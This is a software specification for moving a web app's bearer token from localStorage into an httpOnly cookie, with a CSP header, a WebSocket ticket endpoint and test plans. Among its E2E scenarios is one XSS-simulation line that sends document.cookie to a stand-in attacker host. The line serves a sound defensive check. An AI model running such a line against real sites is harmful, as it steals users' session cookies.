# Specification: Frontend Token Storage Security (Issue #158)

## Overview

The frontend currently persists the bearer token in `localStorage` under the key `shc.settings`. This token is then attached to every API request via the `Authorization: Bearer <token>` header. Any XSS vulnerability in the SPA (or a compromised dependency) can read `localStorage` and exfiltrate the token, granting full API access until the token expires. This specification addresses this vulnerability by moving token storage from `localStorage` to an `httpOnly`, `Secure`, `SameSite` cookie set by the backend, with the token kept only in memory on the frontend for WebSocket connections.

---

## User Stories

### US-1: Cluster Operator — Protection from Token Theft via XSS
> As a **cluster operator**, I want **the bearer token to be stored in an httpOnly cookie instead of localStorage** so that **an XSS vulnerability cannot exfiltrate the token and compromise the cluster**.

**Acceptance Criteria:**
- Bearer token is no longer stored in `localStorage` (`shc.settings.token` is removed or never written)
- Backend sets an `httpOnly`, `Secure`, `SameSite=Strict` cookie named `shc_token` on successful authentication
- Frontend reads the token from the cookie only for WebSocket connections (via `document.cookie` is not accessible for httpOnly; WebSocket must use a different mechanism — see FR-4)
- Token is not accessible via JavaScript (`document.cookie` does not reveal `shc_token`)
- XSS payload executing in the browser cannot read the token

### US-2: Developer — Localhost Development Unaffected
> As a **developer**, I want **localhost development to continue working without HTTPS certificate setup** so that **my local workflow is not disrupted**.

**Acceptance Criteria:**
- On localhost hosts (`localhost`, `127.0.0.1`, `::1`, `.local`, `.lovable.app` per `shared/auth/localhost_hosts.json`), the cookie is set with `Secure=false` (allowing HTTP)
- `SameSite=Lax` on localhost to allow navigation from external links
- Localhost bypass token (`localhost-no-auth`) continues to work without cookie infrastructure

### US-3: Security Auditor — Defense in Depth
> As a **security auditor**, I want **a strict Content-Security-Policy header** so that **the blast radius of any XSS is minimized even if token storage is compromised**.

**Acceptance Criteria:**
- Backend serves a `Content-Security-Policy` header that:
  - Restricts `script-src` to `'self'` (no inline scripts, no `eval`)
  - Restricts `connect-src` to the API origin and WebSocket origin
  - Restricts `frame-ancestors` to `'none'`
  - Includes `base-uri 'self'` and `form-action 'self'`
- CSP is enforced in production; `report-only` mode acceptable for initial rollout

### US-4: Platform Operator — Token Rotation on Compromise
> As a **platform operator**, I want **the ability to invalidate all sessions by rotating the cookie signing key** so that **I can respond to a suspected token leak without waiting for expiry**.

**Acceptance Criteria:**
- Cookie is signed with a secret key (separate from JWT signing key)
- Rotating the cookie secret invalidates all existing cookies immediately
- No database migration required (stateless cookie)

---

## Functional Requirements

### FR-1: Backend — Cookie-Based Token Storage
1. **New endpoint**: `POST /api/v1/auth/token` (existing) returns `200 OK` with `Set-Cookie: shc_token=<token>; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=86400` (24 hours)
2. **Cookie settings**:
   - `HttpOnly`: Prevents JavaScript access
   - `Secure`: Only sent over HTTPS (except localhost — see FR-2)
   - `SameSite=Strict`: CSRF protection (except localhost — see FR-2)
   - `Path=/`: Available on all paths
   - `Max-Age`: 24 hours (configurable via `AUTH_COOKIE_MAX_AGE_SECONDS`, default 86400)
3. **Token validation**: `GET /api/v1/auth/verify` reads token from `Cookie` header (fallback to `Authorization` header for backward compatibility during migration)
4. **Logout endpoint**: `POST /api/v1/auth/logout` clears cookie with `Set-Cookie: shc_token=; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=0`

### FR-2: Backend — Localhost Cookie Configuration
- Detect localhost via existing `is_localhost(request)` utility (matches `shared/auth/localhost_hosts.json`)
- On localhost:
  - `Secure=false` (cookie sent over HTTP)
  - `SameSite=Lax` (allows cross-site navigation to localhost)
- Configuration via environment variables:
  - `AUTH_COOKIE_SECURE` (default: `true`; overridden to `false` on localhost)
  - `AUTH_COOKIE_SAME_SITE` (default: `strict`; overridden to `lax` on localhost)
  - `AUTH_COOKIE_MAX_AGE_SECONDS` (default: `86400`)

### FR-3: Backend — Content-Security-Policy Header
- Add middleware to inject CSP header on all responses:
  ```
  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self' wss:; frame-ancestors 'none'; base-uri 'self'; form-action 'self'
  ```
- **Note**: `'unsafe-inline'` for styles is required for Tailwind/Vite dev; can be removed in production build with nonce/hash
- Configurable via `CSP_POLICY` env var (default as above)
- `CSP_REPORT_ONLY=true` env var enables `Content-Security-Policy-Report-Only` for testing

### FR-4: Frontend — Remove Token from localStorage
1. **Remove `token` field from `Settings` interface** in `frontend/src/lib/settings.ts`
2. **Remove token persistence** in `setSettings` — never write token to localStorage
3. **Login flow**: On successful `POST /auth/token`, do NOT store token in settings. The backend sets the cookie automatically.
4. **Token retrieval for WebSocket**: Since httpOnly cookies are not accessible via JavaScript, the frontend must:
   - Option A: Backend provides a one-time "WebSocket ticket" endpoint (`POST /auth/ws-ticket`) that returns a short-lived token usable only for WebSocket upgrade
   - Option B: Frontend reads a non-httpOnly "signal" cookie (e.g., `shc_ws_token`) set alongside the httpOnly cookie, valid only for WebSocket handshake
   - **Decision**: Option A (WebSocket ticket endpoint) — more secure, token never in JS-accessible storage

### FR-5: Frontend — WebSocket Ticket Endpoint
1. **New endpoint**: `POST /api/v1/auth/ws-ticket` (requires valid cookie auth)
2. Returns: `{ "ticket": "ws_<short-lived-token>", "expires_in": 300 }`
3. Ticket valid for 5 minutes (configurable), single-use
4. Frontend calls this before opening WebSocket, passes ticket via `Sec-WebSocket-Protocol: ["bearer", ticket]`
5. Backend validates ticket on WebSocket upgrade, consumes it (single-use)

### FR-6: Frontend — Login/Logout Flow Updates
1. **Login page**: On submit, call `POST /auth/token`. On success, redirect to dashboard (cookie set by backend). No localStorage token write.
2. **Logout**: Call `POST /auth/logout`, then clear any in-memory state, redirect to login.
3. **Token validation**: `validateToken()` in `httpService` should use cookie auth (no Authorization header needed for cookie-based flow). Keep Authorization header support for backward compatibility (e.g., CLI, agent).

### FR-7: Backend — Backward Compatibility
- `Authorization: Bearer <token>` header continues to work for:
  - CLI (`cli/`)
  - Worker agent (`agent/`)
  - Any non-browser clients
- Cookie auth takes precedence if both present (cookie is more secure for browsers)
- `localhost-no-auth` bypass continues to work via `Host` header check (no cookie needed)

---

## Non-Functional Requirements

### NFR-1: Security
- Cookie must be `HttpOnly` — verified by checking `Set-Cookie` header
- Cookie must be `Secure` in production — verified by HTTPS deployment
- Cookie must be `SameSite=Strict` in production — prevents CSRF
- CSP header present on all responses — verified by `curl -I`
- No token in localStorage — verified by DevTools Application tab

### NFR-2: Compatibility
- Zero breaking changes for non-browser clients (CLI, agent)
- Localhost development works without HTTPS
- Existing tokens in localStorage are ignored (migration: user logs in again)

### NFR-3: Observability
- Log cookie issuance and validation (without token value)
- Metric: `auth_cookie_issued_total`, `auth_cookie_validated_total`, `auth_ws_ticket_issued_total`

---

## API Changes

### New Endpoints

| Endpoint | Method | Auth | Description |
|----------|--------|------|-------------|
| `/api/v1/auth/ws-ticket` | POST | Cookie | Get short-lived WebSocket ticket |

### Modified Endpoints

| Endpoint | Change |
|----------|--------|
| `POST /api/v1/auth/token` | Sets `shc_token` cookie on success |
| `GET /api/v1/auth/verify` | Reads token from `Cookie` header (fallback to `Authorization`) |
| `POST /api/v1/auth/logout` | Clears `shc_token` cookie |

### New Error Codes
- `AUTH_WS_TICKET_EXPIRED` (401) — WebSocket ticket expired or already used
- `AUTH_WS_TICKET_INVALID` (401) — WebSocket ticket malformed or not found

### Response Headers (on auth endpoints)
| Header | Description |
|--------|-------------|
| `Set-Cookie` | `shc_token=<value>; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=86400` |
| `Content-Security-Policy` | CSP policy (see FR-3) |

### Configuration (Environment Variables)
| Variable | Default | Description |
|----------|---------|-------------|
| `AUTH_COOKIE_NAME` | `shc_token` | Cookie name |
| `AUTH_COOKIE_MAX_AGE_SECONDS` | `86400` | Cookie lifetime (24h) |
| `AUTH_COOKIE_SECURE` | `true` | Require HTTPS (auto-false on localhost) |
| `AUTH_COOKIE_SAME_SITE` | `strict` | CSRF protection (auto-lax on localhost) |
| `AUTH_WS_TICKET_TTL_SECONDS` | `300` | WebSocket ticket lifetime (5 min) |
| `CSP_POLICY` | See FR-3 | Content-Security-Policy value |
| `CSP_REPORT_ONLY` | `false` | Use report-only mode |

---

## Migration Notes

1. **No breaking changes** for API clients using `Authorization` header (CLI, agent)
2. **Browser clients**: First login after deployment will set the cookie; existing localStorage token is ignored
3. **Logout required**: Users with existing sessions must log out and back in to get the cookie
4. **Frontend deployment**: Must deploy frontend and backend together (cookie domain/path must match)
5. **Rollback plan**: If issues arise, revert frontend to read token from localStorage (keep `token` field in settings but mark deprecated) and disable cookie issuance via `AUTH_COOKIE_ENABLED=false`

---

## Test Scenarios

### Unit Tests (Backend) — `backend/tests/unit/test_auth_cookie.py`

| Test ID | Description |
|---------|-------------|
| UT-CK-01 | `POST /auth/token` sets `shc_token` cookie with correct attributes (HttpOnly, Secure, SameSite=Strict) |
| UT-CK-02 | `POST /auth/token` on localhost sets `Secure=false`, `SameSite=Lax` |
| UT-CK-03 | `GET /auth/verify` reads token from `Cookie` header |
| UT-CK-04 | `GET /auth/verify` falls back to `Authorization` header |
| UT-CK-05 | `POST /auth/logout` clears cookie with `Max-Age=0` |
| UT-CK-06 | `POST /auth/ws-ticket` returns valid ticket with 5-min TTL |
| UT-CK-07 | WebSocket ticket is single-use (second use returns 401) |
| UT-CK-08 | WebSocket ticket expires after TTL |
| UT-CK-09 | CSP header present on all responses |
| UT-CK-10 | CSP header respects `CSP_REPORT_ONLY` env var |
| UT-CK-11 | `localhost-no-auth` bypass works without cookie |
| UT-CK-12 | Cookie signing key rotation invalidates existing cookies |

### Unit Tests (Frontend) — `frontend/src/lib/settings.test.ts`, `frontend/src/services/http.test.ts`

| Test ID | Description |
|---------|-------------|
| UT-FE-01 | `Settings` interface no longer has `token` field |
| UT-FE-02 | `setSettings` never writes `token` to localStorage |
| UT-FE-03 | `getSettings` returns `token: ""` (empty) |
| UT-FE-04 | Login flow calls `POST /auth/token` and does not persist token |
| UT-FE-05 | Logout flow calls `POST /auth/logout` and clears state |
| UT-FE-06 | `validateToken` works without Authorization header (cookie auth) |
| UT-FE-07 | WebSocket connection obtains ticket via `POST /auth/ws-ticket` |
| UT-FE-08 | WebSocket ticket passed via `Sec-WebSocket-Protocol` |

### Integration Tests (Backend) — `backend/tests/integration/test_auth_cookie.py`

| Test ID | Description |
|---------|-------------|
| IT-CK-01 | Full login flow: `POST /auth/token` → cookie set → `GET /auth/verify` succeeds |
| IT-CK-02 | Cookie auth works across multiple requests |
| IT-CK-03 | Logout clears cookie; subsequent `GET /auth/verify` returns 401 |
| IT-CK-04 | `Authorization` header still works for non-browser clients |
| IT-CK-05 | Localhost: cookie set with `Secure=false`, `SameSite=Lax` |
| IT-CK-06 | Production: cookie set with `Secure=true`, `SameSite=Strict` |
| IT-CK-07 | WebSocket ticket flow: get ticket → upgrade WebSocket → ticket consumed |
| IT-CK-08 | CSP header present on all endpoints including errors |
| IT-CK-09 | Rate limiting (issue #157) applies to new `/auth/ws-ticket` endpoint |

### Integration Tests (Frontend) — `frontend/tests/integration/auth.test.ts`

| Test ID | Description |
|---------|-------------|
| IT-FE-01 | Login page: submit credentials → redirect to dashboard → no token in localStorage |
| IT-FE-02 | Dashboard: API calls work without Authorization header (cookie sent automatically) |
| IT-FE-03 | Logout button: calls logout API → redirect to login → cookie cleared |
| IT-FE-04 | Job logs WebSocket: connects using ticket, receives logs |
| IT-FE-05 | Token not accessible via `document.cookie` (httpOnly verified) |

### E2E / Manual Verification

| Scenario | Steps | Expected |
|----------|-------|----------|
| E2E-CK-01 | Login via UI → check DevTools Application → Cookies | `shc_token` present, HttpOnly=true, Secure=true (prod), SameSite=Strict |
| E2E-CK-02 | Login via UI → check DevTools Application → LocalStorage | `shc.settings` has no `token` field (or empty string) |
| E2E-CK-03 | XSS simulation: `fetch('https://attacker.com/steal?c='+document.cookie)` | `shc_token` NOT in exfiltrated cookies |
| E2E-CK-04 | Open job logs → WebSocket connects → logs stream | WebSocket uses ticket, not raw token |
| E2E-CK-05 | Logout → revisit dashboard → redirects to login | Cookie cleared, session ended |
| E2E-CK-06 | Localhost dev: `npm run dev` → login → cookie set | `Secure=false`, `SameSite=Lax` on cookie |
| E2E-CK-07 | CLI: `shc job list` with `SHC_TOKEN=xxx` | Works via Authorization header (no cookie) |
| E2E-CK-08 | Agent: `run-agent` with token env var | Works via Authorization header |
| E2E-CK-09 | CSP header: `curl -I https://cluster.example.com` | `Content-Security-Policy` header present |

---

## Implementation Plan

### Phase 1: Backend — Cookie Infrastructure
1. Add cookie config to `backend/core/config.py`
2. Create `backend/core/cookies.py` with:
   - `set_auth_cookie(response, token, is_localhost)`
   - `clear_auth_cookie(response, is_localhost)`
   - `get_token_from_cookie(request)` — extracts and validates signed cookie
3. Add cookie signing secret to settings (`AUTH_COOKIE_SECRET`, generated on first run like JWT key)
4. Update `backend/api/v1/auth.py`:
   - `POST /token` → set cookie on success
   - `GET /verify` → read from cookie (fallback to header)
   - `POST /logout` → clear cookie
   - `POST /ws-ticket` → new endpoint
5. Add CSP middleware in `backend/main.py` or `backend/api/middleware.py`

### Phase 2: Backend — WebSocket Ticket Validation
1. Store issued tickets in memory with TTL (dict: `ticket -> expiry`, cleanup on use)
2. Modify WebSocket upgrade in `backend/api/v1/jobs.py` (or wherever WebSocket is handled):
   - Parse `Sec-WebSocket-Protocol` for `bearer` + ticket
   - Validate ticket, consume it, then proceed with normal auth

### Phase 3: Frontend — Remove localStorage Token
1. Update `frontend/src/lib/settings.ts`:
   - Remove `token` from `Settings` interface
   - Remove token from `defaultSettings`
   - Ensure `setSettings` never persists token
2. Update `frontend/src/services/http.ts`:
   - Remove `token` from `getSettings()` destructuring in `request()`
   - Remove `Authorization` header for browser requests (cookie sent automatically)
   - Keep `Authorization` header for `validateToken()` (used by login form before cookie exists)
   - Add `getWsTicket()` function calling `POST /auth/ws-ticket`
   - Update `streamJobLogs` to get ticket first, then connect with ticket

### Phase 4: Frontend — Login/Logout UI
1. Update login page/component to not store token locally
2. Update logout to call `POST /auth/logout`
3. Verify WebSocket ticket flow in job logs component

### Phase 5: Tests & Documentation
1. Write all unit and integration tests
2. Update `openapi.yaml` with new endpoint and cookie auth
3. Update README with new env vars and migration notes

---

## Open Questions

1. **Cookie domain**: Should cookie be set on bare domain (`example.com`) or subdomain (`api.example.com`)? **Decision**: Set on API origin host; frontend must be on same site (same eTLD+1) for cookie to be sent. Document deployment requirement.

2. **Subresource integrity**: Should we add SRI hashes for CSP `script-src`? **Decision**: Phase 2 — requires build-time hash generation.

3. **Token refresh**: Should cookie be refreshed on each request (sliding expiry)? **Decision**: No — fixed 24h expiry; user logs in again. Simpler, more secure.

4. **Multiple tabs**: Cookie is shared across tabs — logout in one tab logs out all. Acceptable.

5. **WebSocket ticket vs. cookie on WebSocket**: Could we pass cookie on WebSocket upgrade? **Decision**: Browsers don't send cookies on WebSocket upgrade reliably across all scenarios (especially cross-origin). Ticket approach is more robust.

---

## Definition of Done

- [ ] Spec reviewed and approved by PM
- [ ] Backend implementation complete (Phases 1–2)
- [ ] Frontend implementation complete (Phases 3–4)
- [ ] All backend unit tests pass (`pytest backend/tests/unit/test_auth_cookie.py`)
- [ ] All backend integration tests pass (`pytest backend/tests/integration/test_auth_cookie.py`)
- [ ] All frontend unit tests pass (`cd frontend && npm test`)
- [ ] All frontend integration tests pass (`cd frontend && npm run test:integration`)
- [ ] Backend gates pass: `ruff check . && ruff format --check . && mypy .` (from repo root)
- [ ] Frontend gates pass: `cd frontend && npm run lint && npm run typecheck`
- [ ] E2E verification complete (manual or Playwright)
- [ ] CI passes on `main` branch
- [ ] PM accepts the work

---

## References

- Issue: #158
- Related: #31 (localhost bypass), #56 (JWT key generation), #157 (auth rate limiting)
- Shared config: `shared/auth/localhost_hosts.json`
- OWASP: Session Management Cheat Sheet — Secure Cookie Attributes
- OWASP: Content Security Policy Cheat Sheet
- RFC 6265: HTTP State Management Mechanism (Cookies)
- RFC 6455: The WebSocket Protocol (Sec-WebSocket-Protocol)